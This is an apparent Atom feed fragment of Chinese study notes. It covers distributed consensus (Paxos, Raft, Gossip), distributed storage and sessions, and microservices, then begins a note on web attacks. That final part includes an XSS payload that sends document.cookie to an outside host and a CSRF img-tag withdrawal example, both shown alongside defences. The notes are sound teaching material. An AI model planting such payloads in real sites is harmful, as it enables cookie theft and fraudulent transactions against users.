<h3 id="_5-会话超时" tabindex="-1"> 5. 会话超时</h3>
<p>如果一个已经获得锁的会话超时了，因为创建的是临时节点，所以该会话对应的临时节点会被删除，其它会话就可以获得锁了。可以看到，Zookeeper 分布式锁不会出现数据库的唯一索引实现的分布式锁释放锁失败问题。</p>
<h3 id="_6-羊群效应" tabindex="-1"> 6. 羊群效应</h3>
<p>一个节点未获得锁，只需要监听自己的前一个子节点，这是因为如果监听所有的子节点，那么任意一个子节点状态改变，其它所有子节点都会收到通知（羊群效应），而我们只希望它的后一个子节点收到通知。</p>
<h1 id="一致性协议-算法" tabindex="-1"> 一致性协议/算法</h1>
<h2 id="paxos" tabindex="-1"> Paxos</h2>
<p>用于达成共识性问题，即对多个节点产生的值，该算法能保证只选出唯一一个值。</p>
<p>主要有三类节点：</p>
<ul>
<li>提议者（Proposer）：提议一个值；</li>
<li>接受者（Acceptor）：对每个提议进行投票；</li>
<li>告知者（Learner）：被告知投票的结果，不参与投票过程。</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/b988877c-0f0a-4593-916d-de2081320628.jpg"/> </div><br>
<h3 id="执行过程" tabindex="-1"> 执行过程</h3>
<p>规定一个提议包含两个字段：[n, v]，其中 n 为序号（具有唯一性），v 为提议值。</p>
<h4 id="_1-prepare-阶段" tabindex="-1"> 1. Prepare 阶段</h4>
<p>下图演示了两个 Proposer 和三个 Acceptor 的系统中运行该算法的初始过程，每个 Proposer 都会向所有 Acceptor 发送 Prepare 请求。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/1a9977e4-2f5c-49a6-aec9-f3027c9f46a7.png"/> </div><br>
<p>当 Acceptor 接收到一个 Prepare 请求，包含的提议为 [n1, v1]，并且之前还未接收过 Prepare 请求，那么发送一个 Prepare 响应，设置当前接收到的提议为 [n1, v1]，并且保证以后不会再接受序号小于 n1 的提议。</p>
<p>如下图，Acceptor X 在收到 [n=2, v=8] 的 Prepare 请求时，由于之前没有接收过提议，因此就发送一个 [no previous] 的 Prepare 响应，设置当前接收到的提议为 [n=2, v=8]，并且保证以后不会再接受序号小于 2 的提议。其它的 Acceptor 类似。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/fb44307f-8e98-4ff7-a918-31dacfa564b4.jpg"/> </div><br>
<p>如果 Acceptor 接收到一个 Prepare 请求，包含的提议为 [n2, v2]，并且之前已经接收过提议 [n1, v1]。如果 n1 &gt; n2，那么就丢弃该提议请求；否则，发送 Prepare 响应，该 Prepare 响应包含之前已经接收过的提议 [n1, v1]，设置当前接收到的提议为 [n2, v2]，并且保证以后不会再接受序号小于 n2 的提议。</p>
<p>如下图，Acceptor Z 收到 Proposer A 发来的 [n=2, v=8] 的 Prepare 请求，由于之前已经接收过 [n=4, v=5] 的提议，并且 n &gt; 2，因此就抛弃该提议请求；Acceptor X 收到 Proposer B 发来的 [n=4, v=5] 的 Prepare 请求，因为之前接收到的提议为 [n=2, v=8]，并且 2 &lt;= 4，因此就发送 [n=2, v=8] 的 Prepare 响应，设置当前接收到的提议为 [n=4, v=5]，并且保证以后不会再接受序号小于 4 的提议。Acceptor Y 类似。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/2bcc58ad-bf7f-485c-89b5-e7cafc211ce2.jpg"/> </div><br>
<h4 id="_2-accept-阶段" tabindex="-1"> 2. Accept 阶段</h4>
<p>当一个 Proposer 接收到超过一半 Acceptor 的 Prepare 响应时，就可以发送 Accept 请求。</p>
<p>Proposer A 接收到两个 Prepare 响应之后，就发送 [n=2, v=8] Accept 请求。该 Accept 请求会被所有 Acceptor 丢弃，因为此时所有 Acceptor 都保证不接受序号小于 4 的提议。</p>
<p>Proposer B 过后也收到了两个 Prepare 响应，因此也开始发送 Accept 请求。需要注意的是，Accept 请求的 v 需要取它收到的最大提议编号对应的 v 值，也就是 8。因此它发送 [n=4, v=8] 的 Accept 请求。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/9b838aee-0996-44a5-9b0f-3d1e3e2f5100.png"/> </div><br>
<h4 id="_3-learn-阶段" tabindex="-1"> 3. Learn 阶段</h4>
<p>Acceptor 接收到 Accept 请求时，如果序号大于等于该 Acceptor 承诺的最小序号，那么就发送 Learn 提议给所有的 Learner。当 Learner 发现有大多数的 Acceptor 接收了某个提议，那么该提议的提议值就被 Paxos 选择出来。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/bf667594-bb4b-4634-bf9b-0596a45415ba.jpg"/> </div><br>
<h3 id="约束条件" tabindex="-1"> 约束条件</h3>
<h4 id="_1-正确性" tabindex="-1"> 1. 正确性</h4>
<p>指只有一个提议值会生效。</p>
<p>因为 Paxos 协议要求每个生效的提议被多数 Acceptor 接收，并且 Acceptor 不会接受两个不同的提议，因此可以保证正确性。</p>
<h4 id="_2-可终止性" tabindex="-1"> 2. 可终止性</h4>
<p>指最后总会有一个提议生效。</p>
<p>Paxos 协议能够让 Proposer 发送的提议朝着能被大多数 Acceptor 接受的那个提议靠拢，因此能够保证可终止性。</p>
<h2 id="raft" tabindex="-1"> Raft</h2>
<p>Raft 也是分布式一致性协议，主要是用来竞选主节点。</p>
<h3 id="单个-candidate-的竞选" tabindex="-1"> 单个 Candidate 的竞选</h3>
<p>有三种节点：Follower、Candidate 和 Leader。Leader 会周期性的发送心跳包给 Follower。每个 Follower 都设置了一个随机的竞选超时时间，一般为 150ms~300ms，如果在这个时间内没有收到 Leader 的心跳包，就会变成 Candidate，进入竞选阶段。</p>
<ul>
<li>下图展示一个分布式系统的最初阶段，此时只有 Follower 没有 Leader。Node A 等待一个随机的竞选超时时间之后，没收到 Leader 发来的心跳包，因此进入竞选阶段。</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/111521118015898.gif"/> </div><br>
<ul>
<li>此时 Node A 发送投票请求给其它所有节点。</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/111521118445538.gif"/> </div><br>
<ul>
<li>其它节点会对请求进行回复，如果超过一半的节点回复了，那么该 Candidate 就会变成 Leader。</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/111521118483039.gif"/> </div><br>
<ul>
<li>之后 Leader 会周期性地发送心跳包给 Follower，Follower 接收到心跳包，会重新开始计时。</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/111521118640738.gif"/> </div><br>
<h3 id="多个-candidate-竞选" tabindex="-1"> 多个 Candidate 竞选</h3>
<ul>
<li>如果有多个 Follower 成为 Candidate，并且所获得票数相同，那么就需要重新开始投票。例如下图中 Node B 和 Node D 都获得两票，需要重新开始投票。</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/111521119203347.gif"/> </div><br>
<ul>
<li>由于每个节点设置的随机竞选超时时间不同，因此下一次再次出现多个 Candidate 并获得同样票数的概率很低。</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/111521119368714.gif"/> </div><br>
<h2 id="gossip" tabindex="-1"> Gossip</h2>
<p>Gossip协议主要用在分布式数据库系统中各个副本节点同步数据之用，这种场景的一个最大特点就是组成的网络的节点都是对等节点，是非结构化网络，</p>
<h3 id="优点" tabindex="-1"> 优点</h3>
<ul>
<li>扩展性：网络可以允许节点的任意增加和减少，新增加的节点的状态最终会与其他节点一致。</li>
<li>容错：网络中任何节点的宕机和重启都不会影响 Gossip 消息的传播，Gossip 协议具有天然的分布式系统容错特性。</li>
<li>去中心化：Gossip 协议不要求任何中心节点，所有节点都可以是对等的，任何一个节点无需知道整个网络状况，只要网络是连通的，任意一个节点就可以把消息散播到全网。</li>
<li>一致性收敛：Gossip 协议中的消息会以一传十、十传百一样的指数级速度在网络中快速传播，因此系统状态的不一致可以在很快的时间内收敛到一致。消息传播速度达到了 logN。</li>
<li>简单：Gossip 协议的过程极其简单，实现起来几乎没有太多复杂性。</li>
</ul>
<h3 id="缺点" tabindex="-1"> 缺点</h3>
<ul>
<li>消息的延迟：由于 Gossip 协议中，节点只会随机向少数几个节点发送消息，消息最终是通过多个轮次的散播而到达全网的，因此使用 Gossip 协议会造成不可避免的消息延迟。不适合用在对实时性要求较高的场景下。</li>
<li>消息冗余：Gossip 协议规定，节点会定期随机选择周围节点发送消息，而收到消息的节点也会重复该步骤，因此就不可避免的存在消息重复发送给同一节点的情况，造成了消息的冗余，同时也增加了收到消息的节点的处理压力。而且，由于是定期发送而且不反馈，因此，即使节点收到了消息，还是会反复收到重复消息，加重了消息的冗余。</li>
</ul>
<h3 id="数据同步" tabindex="-1"> 数据同步</h3>
<ul>
<li>来自客户端的修改都会被传入 Leader。注意该修改还未被提交，只是写入日志中。</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/71550414107576.gif"/> </div><br>
<ul>
<li>Leader 会把修改复制到所有 Follower。</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/91550414131331.gif"/> </div><br>
<ul>
<li>Leader 会等待大多数的 Follower 也进行了修改，然后才将修改提交。</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/101550414151983.gif"/> </div><br>
<ul>
<li>此时 Leader 会通知的所有 Follower 让它们也提交修改，此时所有节点的值达成一致。</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/111550414182638.gif"/> </div><br>
<h1 id="分布式存储" tabindex="-1"> 分布式存储</h1>
<p>分布式存储系统将数据分散存储在多台独立的设备上。传统的网络存储系统采用集中的存储服务器存放所有数据，存储服务器成为系统性能的瓶颈，也是可靠性和安全性的焦点，不能满足大规模存储应用的需要。分布式网络存储系统采用可扩展的系统结构，利用多台存储服务器分担存储负荷，利用位置服务器定位存储信息，它不但提高了系统的可靠性、可用性和存取效率，还易于扩展。</p>
<h2 id="分布式存储系统特性" tabindex="-1"> 分布式存储系统特性</h2>
<h3 id="可扩展" tabindex="-1"> 可扩展</h3>
<p>分布式存储系统可以扩展到几百台甚至几千台的集群规模，而且随着集群规模的增长，系统整体性能表现为线性增长。</p>
<h3 id="低成本" tabindex="-1"> 低成本</h3>
<p>分布式存储系统的自动容错、自动负载均衡机制使其可以构建在普通的PC机之上。另外，线性扩展能力也使得增加、减少机器非常方便，可以实现自动运维。</p>
<h3 id="高性能" tabindex="-1"> 高性能</h3>
<p>无论是针对整个集群还是单台服务器，都要求分布式存储系统具备高性能。</p>
<h3 id="易用" tabindex="-1"> 易用</h3>
<p>分布式存储系统需要能够提供易用的对外接口，另外，也要求具备完善的监控、运维工具，并能够文玩 与其他系统集成。</p>
<h2 id="技术难点" tabindex="-1"> 技术难点</h2>
<p>分布式存储系统的挑战主要在于数据、状态信息的持久化，要求在自动迁移、自动容错、并发读写的过程中保证数据的一致性。分布式存储涉及的技术主要来自两个领域：分布式系统以及数据库。</p>
<h3 id="数据分布-负载均衡" tabindex="-1"> 数据分布 负载均衡</h3>
<h4 id="哈希算法" tabindex="-1"> 哈希算法</h4>
<p>按照key的hash值对节点进行取模，然后得到的结果就是存放数据的节点；</p>
<p>缺点：如果一个节点挂了，新的数据按照新的节点数据取模导致无法取到数据（所有数据都取不到），于是就会被击穿到数据库，导致数据库压力增大。同时需要重新进行大量计算，把原有数据进行重新分配。</p>
<h4 id="一致性哈希算法" tabindex="-1"> 一致性哈希算法</h4>
<p>把节点分布到一个圆环中分布，key的hash值于当前节点hash值比较，然后确定在圆环上的位置，同时按照顺时针方向去寻找最近的一个节点。</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-17-31-12.png" alt="" loading="lazy"></p>
<p>按照上述理论，当一个节点失效的时候，就只有这个节点对应的数据无法取到，而其他节点数据依然还是可以取到。所以，可用性比hash算法要高。</p>
<p>缺点：针对热点数据问题，可能都会涌入到同一个节点中，而其他节点数据又少。</p>
<p>解决办法：</p>
<p>虚拟节点、均匀一致性hash：在圆环中增加多个虚拟的同类节点，比如原来有1号 2 号 3号 这三个节点，现在虚拟出多个1号、2好、3号的节点分布在圆环上，这样就可以更细粒度的切割圆环数据，尽量减少了热点数据集中问题。</p>
<h4 id="hash-slot-算法" tabindex="-1"> hash slot 算法</h4>
<p>上述都是物理节点的分布做算法，而redis cluster是通过在节点中分布虚拟的小节点来分布数据。redis cluster会在整个集群节点中分布 16384 个虚拟slot。每个节点分配一部分slot。然后所有的key的hash对 16384 取模，从而知道在哪个slot，也就知道了数据在哪个节点上。 当一个节点挂了时，就会把这个节点上的slot迁移到其他节点上。</p>
<p>可以认为hash slot 算法，是一致性hash算法的优化。</p>
<p>优点：即拥有了一致性hash算法的优点，又避免了热点数据；</p>
<p>master的增加和移除也是非常方面，增加master，就把其他节点的slot移动到这个master。移除master，就把当前master的slot移动到其他节点。</p>
<h3 id="数据一致性" tabindex="-1"> 数据一致性</h3>
<h3 id="容错" tabindex="-1"> 容错</h3>
<h2 id="分布式存储系统分类" tabindex="-1"> 分布式存储系统分类</h2>
<p>分布式存储系统需要存储的数据多种多样，大致上可分为：非结构化数据，如文本文件、图片、视频和音频等格式；结构化数据，一般存在关系数据库中，可以用二维关系表结构来表示，模式与内容是分开的；半结构化数据，如HTML文档，模式结构与内容是放在一起的。</p>
<h3 id="分布式文件系统" tabindex="-1"> 分布式文件系统</h3>
<p>互联网应用需要存储大量的图片、照片和视频等非结构化数据对象，这类数据以对象的形式组织，对象之间没有关联，这样的数据一般称为Blob(Binary large object)数据。</p>
<p>分布式文件系统适合存储Blob对象，典型的如谷歌的GFS以及它的开源实现HDFS。在系统实现层面，分布式文件系统内部按照数据块（chunk）来组织数据，每个数据块的大小相同，每个数据块可以包含多个Blob 对象或者定长块，一个大文件也可以拆分成多个数据块。</p>
<h3 id="分布式键值系统" tabindex="-1"> 分布式键值系统</h3>
<p>分布式键值系统存储关系简单的半结构化数据，它只提供主键的CRUD功能，如Dynamo、Redis和Memcache。从数据结构来看，分布式键值系统与传统的哈希表比较类似，不同的是，分布式系统支持将数据分布到集群中的多个存储结点。分布式键值系统是分布式表格系统的一种简化实现，一般用作缓存。一致性哈希是分布式键值系统中常用的数据分布技术。</p>
<h3 id="分布式表格系统" tabindex="-1"> 分布式表格系统</h3>
<p>分布式表格系统用于存储关系较为复杂的半结构化数据，与分布式键值系统相比，分布式表格系统不仅仅支持简单的CRUD 操作，而且支持扫描某个主键范围。分布式表格系统以表格为单位组织数据，每个表格包括很多行，通过主键标识一行，支持根据主键的CRUD功能以及范围查找功能。</p>
<p>分布式表格系统借鉴了很多关系数据库的技术，例如支持某种程度上的事务。典型的系统如Bigtable、HBase和DynamoDB。与分布式数据库相比，分布式表格系统主要针对单张表格的操作，不支持一些特别复杂的操作，比如多表关联、多表连接、嵌套子查询。而且在分布式表格系统中，同一个表格的多个数据行也不要求包含相同类型的列，适合半结构化数据。分布式表格系统是一种很好的权衡，这类系统可以做到超大规模，而且支持较多的功能，但实现往往比较复杂。</p>
<h3 id="分布式数据库" tabindex="-1"> 分布式数据库</h3>
<p>分布式数据库一般是从单机关系数据库扩展而来，用于存储结构化数据。分布式数据库采用二维表格组织数据，提供SQL关系查询语言，支持多表关联，嵌套子查询等复杂操作，并提供数据库事务以及并发控制。典型的如MySQL数据库集群、Amazon RDS及Microsoft SQL Azure。</p>
<h1 id="分布式session" tabindex="-1"> 分布式session</h1>
<h2 id="session-stick" tabindex="-1"> Session Stick</h2>
<p>Session Stick 方案即将客户端的每次请求都转发至同一台服务器，这就需要负载均衡器能够根据每次请求的会话标识（SessionId）来进行请求转发，如下图所示。</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-13-21-25-46.png" alt="" loading="lazy"></p>
<h2 id="session-replication" tabindex="-1"> Session Replication</h2>
<p>Session Replication 的方案则不对负载均衡器做更改，而是在Web服务器之间增加了会话数据同步的功能，各个服务器之间通过同步保证不同Web服务器之间的Session数据的一致性，如下图所示。</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-13-21-26-07.png" alt="" loading="lazy"></p>
<p>Session Replication 方案对负载均衡器不再有要求，但是同样会带来以下问题：</p>
<ul>
<li>同步Session数据会造成额外的网络带宽的开销，只要Session数据有变化，就需要将新产生的Session数据同步到其他服务器上，服务器数量越多，同步带来的网络带宽开销也就越大。</li>
<li>每台Web服务器都需要保存全部的Session数据，如果整个集群的Session数量太多的话，则对于每台机器用于保存Session数据的占用会很严重。</li>
</ul>
<h2 id="session-数据集中存储" tabindex="-1"> Session 数据集中存储</h2>
<p>Session 数据集中存储方案则是将集群中的所有Session集中存储起来，Web服务器本身则并不存储Session数据，不同的Web服务器从同样的地方来获取Session，如下图所示。
<img src="@source/assets/cs-note/distribute/mk-2020-07-13-21-26-55.png" alt="" loading="lazy"></p>
<p>相对于Session Replication方案，此方案的Session数据将不保存在本机，并且Web服务器之间也没有了Session数据的复制，但是该方案存在的问题在于：</p>
<p>读写Session数据引入了网络操作，这相对于本机的数据读取来说，问题就在于存在时延和不稳定性，但是通信发生在内网，则问题不大。
如果集中存储Session的机器或集群出现问题，则会影响应用。</p>
<h2 id="cookie-based" tabindex="-1"> Cookie Based</h2>
<p>Cookie Based 方案是将Session数据放在Cookie里，访问Web服务器的时候，再由Web服务器生成对应的Session数据，如下图所示。
<img src="@source/assets/cs-note/distribute/mk-2020-07-13-21-27-28.png" alt="" loading="lazy"></p>
<p>但是Cookie Based 方案依然存在不足：</p>
<ul>
<li>Cookie长度的限制。这会导致Session长度的限制。</li>
<li>安全性。Seesion数据本来是服务端数据，却被保存在了客户端，即使可以加密，但是依然存在不安全性。</li>
<li>带宽消耗。这里不是指内部Web服务器之间的宽带消耗，而是数据中心的整体外部带宽的消耗。</li>
<li>性能影响。每次HTTP请求和响应都带有Seesion数据，对Web服务器来说，在同样的处理情况下，响应的结果输出越少，支持的并发就会越高。</li>
</ul>
<h1 id="分布式计算" tabindex="-1"> 分布式计算</h1>
<p>所谓分布式计算是一门计算机科学，它研究如何把一个需要非常巨大的计算能力才能解决的问题分成许多小的部分，然后把这些部分分配给许多计算机进行处理，最后把这些计算结果综合起来得到最终的结果。 分布式网络存储技术是将数据分散的存储于多台独立的机器设备上。分布式网络存储系统采用可扩展的系统结构，利用多台存储服务器分担存储负荷，利用位置服务器定位存储信息，不但解决了传统集中式存储系统中单存储服务器的瓶颈问题，还提高了系统的可靠性、可用性和扩展性。</p>
<p><a href="https://blog.csdn.net/qq_34337272/article/details/80549020" target="_blank" rel="noopener noreferrer">关于分布式计算的一些概念</a></p>
<h1 id="参考" tabindex="-1"> 参考</h1>
<ul>
<li>倪超. 从 Paxos 到 ZooKeeper : 分布式一致性原理与实践 [M]. 电子工业出版社, 2015.</li>
<li><a href="https://redis.io/topics/distlock" target="_blank" rel="noopener noreferrer">Distributed locks with Redis</a></li>
<li><a href="http://www.linkedkeeper.com/detail/blog.action?bid=1023" target="_blank" rel="noopener noreferrer">浅谈分布式锁</a></li>
<li><a href="http://www.dengshenyu.com/java/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/2017/10/23/zookeeper-distributed-lock.html" target="_blank" rel="noopener noreferrer">基于 Zookeeper 的分布式锁</a></li>
<li><a href="http://thesecretlivesofdata.com/raft" target="_blank" rel="noopener noreferrer">Raft: Understandable Distributed Consensus</a></li>
<li><a href="https://www.cnblogs.com/savorboard/p/distributed-system-transaction-consistency.html" target="_blank" rel="noopener noreferrer">聊聊分布式事务，再说说解决方案</a></li>
<li><a href="https://coolshell.cn/articles/10910.html" target="_blank" rel="noopener noreferrer">分布式系统的事务处理</a></li>
<li><a href="https://juejin.im/entry/577c6f220a2b5800573492be" target="_blank" rel="noopener noreferrer">深入理解分布式事务</a></li>
<li><a href="http://www.colooshiki.com/index.php/2017/04/20/what-is-cap-theorem-in-distributed-database-system/" target="_blank" rel="noopener noreferrer">What is CAP theorem in distributed database system?</a></li>
<li><a href="http://harry.me/blog/2014/12/27/neat-algorithms-paxos/" target="_blank" rel="noopener noreferrer">NEAT ALGORITHMS - PAXOS</a></li>
<li><a href="https://angus.nyc/2012/paxos-by-example/" target="_blank" rel="noopener noreferrer">Paxos By Example</a></li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">微服务简介</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/%E5%BE%AE%E6%9C%8D%E5%8A%A1.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/%E5%BE%AE%E6%9C%8D%E5%8A%A1.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[

<h1 id="微服务简介" tabindex="-1"> 微服务简介</h1>
<p>微服务架构的出现主要是为了有效的拆分应用，以实现应用间的解耦、敏捷开发和部属。服务被拆得多了自然就增加了复杂度：客户端如何访问微服务的能力、服务之间如何通信、其中一个服务挂了如何解决问题等等。因此微服务框架应运而生，帮助我们解决上述这些问题，愉快的开发业务逻辑。</p>
<h2 id="soa到msa的进化" tabindex="-1"> SOA到MSA的进化</h2>
<p>SOA面向服务架构
由于业务发展到一定层度后，需要对服务进行解耦，进而把一个单一的大系统按逻辑拆分成不同的子系统，通过服务接口来通讯，面向服务的设计模式，最终需要总线集成服务，而且大部分时候还共享数据库，出现单点故障的时候会导致总线层面的故障，更进一步可能会把数据库拖垮，所以才有了更加独立的设计方案的出现。</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-15-04-13.png" alt="" loading="lazy"></p>
<p>MSA微服务架构
微服务是真正意义上的独立服务，从服务入口到数据持久层，逻辑上都是独立隔离的，无需服务总线来接入，但同时增加了整个分布式系统的搭建和管理难度，需要对服务进行编排和管理，所以伴随着微服务的兴起，微服务生态的整套技术栈也需要无缝接入，才能支撑起微服务的治理理念。</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-15-04-43.png" alt="" loading="lazy"></p>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">一、跨站脚本攻击</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li></li>
<li></li>
</ul>

<h1 id="一、跨站脚本攻击" tabindex="-1"> 一、跨站脚本攻击</h1>
<h2 id="概念" tabindex="-1"> 概念</h2>
<p>跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。</p>
<h2 id="攻击原理" tabindex="-1"> 攻击原理</h2>
<p>例如有一个论坛网站，攻击者可以在上面发布以下内容：</p>
<div><pre><code><span><span><span>&lt;</span>script</span><span>></span></span><span><span>location<span>.</span>href<span>=</span><span>"//domain.com/?c="</span> <span>+</span> document<span>.</span>cookie</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre></div><p>之后该内容可能会被渲染成以下形式：</p>
<div><pre><code><span><span><span>&lt;</span>p</span><span>></span></span><span><span><span>&lt;</span>script</span><span>></span></span><span><span>location<span>.</span>href<span>=</span><span>"//domain.com/?c="</span> <span>+</span> document<span>.</span>cookie</span></span><span><span><span>&lt;/</span>script</span><span>></span></span><span><span><span>&lt;/</span>p</span><span>></span></span>
</code></pre></div><p>另一个用户浏览了含有这个内容的页面将会跳转到 domain.com 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。</p>
<h2 id="危害" tabindex="-1"> 危害</h2>
<ul>
<li>窃取用户的 Cookie</li>
<li>伪造虚假的输入表单骗取个人信息</li>
<li>显示伪造的文章或者图片</li>
</ul>
<h2 id="防范手段" tabindex="-1"> 防范手段</h2>
<h3 id="_1-设置-cookie-为-httponly" tabindex="-1"> 1. 设置 Cookie 为 HttpOnly</h3>
<p>设置了 HttpOnly 的 Cookie 可以防止 JavaScript 脚本调用，就无法通过 document.cookie 获取用户 Cookie 信息。</p>
<h3 id="_2-过滤特殊字符" tabindex="-1"> 2. 过滤特殊字符</h3>
<p>例如将 <code>&lt;</code> 转义为 <code>&amp;lt;</code>，将 <code>&gt;</code> 转义为 <code>&amp;gt;</code>，从而避免 HTML 和 Jascript 代码的运行。</p>
<p>富文本编辑器允许用户输入 HTML 代码，就不能简单地将 <code>&lt;</code> 等字符进行过滤了，极大地提高了 XSS 攻击的可能性。</p>
<p>富文本编辑器通常采用 XSS filter 来防范 XSS 攻击，通过定义一些标签白名单或者黑名单，从而不允许有攻击性的 HTML 代码的输入。</p>
<p>以下例子中，form 和 script 等标签都被转义，而 h 和 p 等标签将会保留。</p>
<div><pre><code><span><span><span>&lt;</span>h1</span> <span>id</span><span><span>=</span><span>"</span>title<span>"</span></span><span>></span></span>XSS Demo<span><span><span>&lt;/</span>h1</span><span>></span></span>

<span><span><span>&lt;</span>p</span><span>></span></span>123<span><span><span>&lt;/</span>p</span><span>></span></span>

<span><span><span>&lt;</span>form</span><span>></span></span>
  <span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>"</span>text<span>"</span></span> <span>name</span><span><span>=</span><span>"</span>q<span>"</span></span> <span>value</span><span><span>=</span><span>"</span>test<span>"</span></span><span>></span></span>
<span><span><span>&lt;/</span>form</span><span>></span></span>

<span><span><span>&lt;</span>pre</span><span>></span></span>hello<span><span><span>&lt;/</span>pre</span><span>></span></span>

<span><span><span>&lt;</span>script</span> <span>type</span><span><span>=</span><span>"</span>text/javascript<span>"</span></span><span>></span></span><span><span>
<span>alert</span><span>(</span><span><span>/</span><span>xss</span><span>/</span></span><span>)</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br></div></div><div><pre><code><span><span><span>&lt;</span>h1</span><span>></span></span>XSS Demo<span><span><span>&lt;/</span>h1</span><span>></span></span>

<span><span><span>&lt;</span>p</span><span>></span></span>123<span><span><span>&lt;/</span>p</span><span>></span></span>

<span title="&lt;">&amp;lt;</span>form<span title="&gt;">&amp;gt;</span>
  <span title="&lt;">&amp;lt;</span>input type="text" name="q" value="test"<span title="&gt;">&amp;gt;</span>
<span title="&lt;">&amp;lt;</span>/form<span title="&gt;">&amp;gt;</span>

<span><span><span>&lt;</span>pre</span><span>></span></span>hello<span><span><span>&lt;/</span>pre</span><span>></span></span>

<span title="&lt;">&amp;lt;</span>script type="text/javascript"<span title="&gt;">&amp;gt;</span>
alert(/xss/);
<span title="&lt;">&amp;lt;</span>/script<span title="&gt;">&amp;gt;</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br></div></div><blockquote>
<p><a href="http://jsxss.com/zh/try.html" target="_blank" rel="noopener noreferrer">XSS 过滤在线测试</a></p>
</blockquote>
<h1 id="二、跨站请求伪造" tabindex="-1"> 二、跨站请求伪造</h1>
<h2 id="概念-1" tabindex="-1"> 概念</h2>
<p>跨站请求伪造（Cross-site request forgery，CSRF），是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。</p>
<p>XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户浏览器的信任。</p>
<h2 id="攻击原理-1" tabindex="-1"> 攻击原理</h2>
<p>假如一家银行用以执行转账操作的 URL 地址如下：</p>
<div><pre><code>http://www.examplebank.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=PayeeName。
</code></pre></div><p>那么，一个恶意攻击者可以在另一个网站上放置如下代码：</p>
<div><pre><code>&lt;img src="http://www.examplebank.com/withdraw?account=Alice&amp;amount=1000&amp;for=Badman">。
</code></pre></div><p>如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失 1000 美元。</p>
